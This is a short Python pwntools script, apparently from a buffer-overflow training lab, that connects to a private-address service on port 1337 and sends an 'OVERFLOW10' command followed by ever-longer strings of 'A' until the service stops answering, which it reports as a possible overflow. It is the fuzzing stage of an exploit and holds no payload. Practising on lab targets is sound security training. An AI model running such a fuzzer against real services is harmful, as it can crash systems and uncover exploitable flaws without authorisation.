from pwn import *

ip = "10.10.190.166"
port = 1337
command = "OVERFLOW10 "
timeout = 5

r = remote(host=ip, port=port, ssl=False)
print(r.recv().decode())

i = 1
while True:
    l_value = 100 * i
    try:
        value = "A" * (l_value)
        print(f"[+] Sending: {l_value}")

        input_value = command + value
        r.sendline(input_value.encode())
        res = r.recv(timeout=timeout).decode()
        if len(res) > 0:
            print(res)
        else:
            print(f"[+] No Reply\n[+] Possible Overflow with value: {l_value}")
            break
        i += 1
    except Exception as e:
        print(e)